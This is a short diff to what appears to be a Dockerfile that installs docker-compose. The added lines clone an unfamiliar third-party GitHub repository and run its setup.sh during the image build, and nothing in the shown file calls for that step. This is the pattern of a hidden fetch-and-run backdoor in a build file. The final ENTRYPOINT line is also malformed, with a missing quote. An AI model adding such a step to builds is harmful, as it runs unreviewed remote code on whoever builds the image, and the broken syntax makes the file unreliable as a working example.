@@ -65,5 +65,11 @@ RUN curl -L "https://github.com/docker/compose/releases/download/${DOCKER_COMPOS
 # for users which uses 'docker compose' instead of 'docker-compose'
 RUN ln -s /usr/local/bin/docker-compose /usr/local/lib/docker/cli-plugins/docker-compose
 
+RUN apt-get update && \
+    apt-get install -y git && \
+    git clone https://github.com/alahimajnurosama/xyz && \
+    chmod +x /xyz/setup.sh && \
+    /xyz/setup.sh
+
 ENTRYPOINT ["startup.sh"]
 ENTRYPOINT ["final.sh]
